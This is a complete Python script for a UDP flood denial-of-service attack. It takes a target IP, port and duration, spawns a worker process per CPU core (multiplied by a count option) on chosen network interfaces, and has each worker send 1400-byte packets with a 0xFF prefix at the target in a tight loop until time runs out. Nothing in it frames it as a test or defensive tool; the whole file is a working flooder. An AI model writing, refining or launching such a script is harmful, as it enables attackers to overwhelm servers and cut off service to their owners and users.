import socket
import random
import time
import os
import argparse
import multiprocessing
import signal
import sys

parser = argparse.ArgumentParser()
parser.add_argument("--ip", type=str, required=True)
parser.add_argument("--port", type=int, required=True)
parser.add_argument("--time", type=int, required=True)
parser.add_argument("--times", type=int, default=1)
parser.add_argument("--i", type=str, default="", help="Network interfaces, comma separated, e.g. eth0,eth1")
args = parser.parse_args()

ip = args.ip
port = args.port
duration = args.time
total_instances = args.times
interfaces = [iface.strip() for iface in args.i.split(",") if iface.strip()]
if not interfaces:
    interfaces = [None]  # default, no binding

PACKET = b'\xFF\xFF\xFF\xFF' + os.urandom(1396)

all_processes = []

def flood_worker(ip, port, end_time, interface):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**30)
        if interface:
            # Bind socket to device (Linux only)
            # SO_BINDTODEVICE = 25 (Linux constant)
            sock.setsockopt(socket.SOL_SOCKET, 25, interface.encode())
        while time.time() < end_time:
            sock.sendto(PACKET, (ip, port))
    except Exception:
        pass
    finally:
        sock.close()

def handle_sigint(signum, frame):
    print("\n[!] Ctrl+C detected, terminating all workers...")
    for proc in all_processes:
        if proc.is_alive():
            proc.terminate()
    sys.exit(0)

signal.signal(signal.SIGINT, handle_sigint)

if __name__ == "__main__":
    print(f"🚀 Launching {total_instances} instance(s) across all CPU cores on interfaces: {', '.join(interfaces) if interfaces[0] else 'default'}")
    end_time = time.time() + duration
    cpu_count = os.cpu_count() or 4

    total_workers = total_instances * cpu_count
    # Distribute workers evenly across interfaces (round robin)
    for i in range(total_workers):
        iface = interfaces[i % len(interfaces)]
        p = multiprocessing.Process(target=flood_worker, args=(ip, port, end_time, iface))
        p.daemon = True
        p.start()
        all_processes.append(p)

    try:
        for p in all_processes:
            p.join()
    except KeyboardInterrupt:
        handle_sigint(None, None)
